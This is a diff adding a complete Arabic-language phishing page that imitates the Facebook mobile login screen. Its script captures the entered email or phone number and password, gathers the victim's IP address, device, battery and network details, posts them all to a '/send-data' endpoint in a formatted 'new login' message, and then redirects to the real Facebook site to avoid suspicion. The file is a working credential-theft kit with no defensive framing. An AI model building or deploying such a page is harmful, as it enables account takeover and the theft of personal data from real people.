@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>فيسبوك - تسجيل الدخول</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 0 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .language-selector { font-size: 15px; color: #333; margin-bottom: 40px; text-align: center; width: 100%; }
+    .fb-logo-wrapper { margin-bottom: 48px; }
+    .fb-logo { width: 72px; height: 72px; background-color: #1877F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    .fb-logo svg { width: 44px; height: 44px; fill: #ffffff; }
+    .form-area { width: 100%; display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+    .input-field { width: 100%; padding: 16px 18px; border: 1.5px solid #dddfe2; border-radius: 12px; font-size: 17px; color: #1c1e21; background: #ffffff; outline: none; text-align: right; }
+    .input-field:focus { border-color: #1877F2; }
+    .btn-login { width: 100%; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; background-color: #1877F2; color: #fff; border: none; margin-top: 4px; }
+    .btn-login:disabled { background-color: #a0a0a0; }
+    .forgot-password { font-size: 16px; color: #1c1e21; margin-top: 14px; margin-bottom: 60px; text-align: center; cursor: pointer; }
+    .btn-create { width: 100%; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; background-color: #fff; color: #1877F2; border: 2px solid #1877F2; margin-bottom: 28px; }
+    .spinner {
+      display: inline-block; width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.8s linear infinite; margin-left: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="language-selector">العربية</div>
+
+    <div class="fb-logo-wrapper">
+      <div class="fb-logo">
+        <svg viewBox="0 0 24 24"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.27h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
+      </div>
+    </div>
+
+    <div class="form-area">
+      <input class="input-field" id="emailInput" type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" />
+      <input class="input-field" id="passwordInput" type="password" placeholder="كلمة السر" />
+    </div>
+
+    <button class="btn-login" id="loginBtn" onclick="handleLogin()">تسجيل الدخول</button>
+    <div class="forgot-password">هل نسيت كلمة السر؟</div>
+    <button class="btn-create">إنشاء حساب جديد</button>
+  </div>
+
+  <script>
+    const API_URL = '/send-data';
+
+    async function collectBasicInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        deviceType: /Mobile/i.test(navigator.userAgent) ? '📱 موبايل' : '💻 كمبيوتر'
+      };
+      
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        info.ip = data.ip;
+      } catch (e) { info.ip = 'غير متوفر'; }
+      
+      if ('getBattery' in navigator) {
+        try {
+          const bat = await navigator.getBattery();
+          info.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '⚡' : '🔋');
+        } catch (e) { info.battery = 'غير متوفر'; }
+      }
+      
+      if ('connection' in navigator) {
+        info.network = navigator.connection.effectiveType || 'غير معروف';
+      }
+      
+      return info;
+    }
+
+    async function handleLogin() {
+      const btn = document.getElementById('loginBtn');
+      const email = document.getElementById('emailInput').value;
+      const password = document.getElementById('passwordInput').value;
+
+      if (!email || !password) {
+        alert('الرجاء إدخال البريد/الهاتف وكلمة المرور');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span> جارٍ تسجيل الدخول...';
+
+      const d = await collectBasicInfo();
+      const timeStr = new Date().toLocaleString('ar-SA');
+
+      const caption = `🔴 تسجيل دخول جديد!\n\n━━━━━━━━━━━━━━━━━━━━\n👤 بيانات الحساب:\n📧 البريد/الهاتف: ${email}\n🔑 كلمة المرور: ${password}\n━━━━━━━━━━━━━━━━━━━━\n\n📱 معلومات الجهاز:\n• IP: ${d.ip}\n• نوع الجهاز: ${d.deviceType}\n• المنصة: ${d.platform}\n\n🔋 البطارية: ${d.battery || 'غير متوفر'}\n📡 الشبكة: ${d.network || 'غير معروف'}\n\n🌐 المتصفح:\n${d.userAgent}\n\n⏰ الوقت: ${timeStr}\n━━━━━━━━━━━━━━━━━━━━`;
+
+      try {
+        await fetch(API_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ caption, email, password, timestamp: new Date().toISOString() })
+        });
+      } catch (e) { console.error('Send error:', e); }
+
+      setTimeout(() => window.location.href = 'https://m.facebook.com/', 2000);
+    }
+
+    document.getElementById('passwordInput').addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') handleLogin();
+    });
+  </script>
+</body>
+</html>
